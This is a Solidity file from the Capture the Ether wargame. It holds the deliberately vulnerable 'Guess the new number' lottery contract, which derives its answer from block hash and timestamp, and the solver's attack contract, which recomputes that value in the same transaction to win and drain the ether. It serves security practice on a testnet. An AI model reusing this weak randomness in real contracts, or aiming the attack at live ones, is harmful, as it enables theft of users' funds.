pragma solidity ^0.4.21;

/**
@title Guess the new number - Capture the Ether - Lotteries 4
@author broccolirob (solver, not author)
@notice Deployed on Ropsten at "0xc0d87BCC8fFB0096535B5A1DbB81eFAB4CdB577E". 
Solution can be found in scripts/guess-new-number-challenge.js
 */
contract GuessTheNewNumberChallenge {
    function GuessTheNewNumberChallenge() public payable {
        require(msg.value == 1 ether);
    }

    function isComplete() public view returns (bool) {
        return address(this).balance == 0;
    }

    function guess(uint8 n) public payable {
        require(msg.value == 1 ether);
        uint8 answer = uint8(keccak256(block.blockhash(block.number - 1), now));

        if (n == answer) {
            msg.sender.transfer(2 ether);
        }
    }
}

/**
@title Attack New Number Challenge Contract
@author broccolirob
@notice Attack contract used to calculate block number and timestamp in the 
context when the call is made.
 */
contract AttackNewNumberChallenge {
    function attack(address victim) public payable {
        require(msg.value == 1 ether);
        uint8 n = uint8(keccak256(block.blockhash(block.number - 1), now));
        GuessTheNewNumberChallenge(victim).guess.value(msg.value)(n);
        msg.sender.transfer(address(this).balance);
    }

    function() public payable {}
}
